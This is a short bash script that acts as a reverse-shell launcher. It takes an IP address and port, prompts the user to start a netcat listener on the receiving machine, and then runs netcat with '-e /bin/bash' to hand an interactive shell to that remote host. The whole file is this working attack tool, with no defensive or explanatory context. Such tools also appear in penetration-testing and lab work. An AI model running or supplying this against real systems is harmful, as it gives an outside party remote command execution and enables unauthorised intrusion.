#!/bin/bash

################################################################################

MY_NAME=$(basename $0)

if [ "$#" -ne 2 ]; then
    echo "Usage: $MY_NAME <ip> <port>"
    exit 1
fi

ip=$1
port=$2

echo
echo "Start running the server on the receiving end, e.g.:"
echo "  nc -nlvp $port"
read -p "Press any key to send the shell..."

nc -nv $ip $port -e /bin/bash

################################################################################
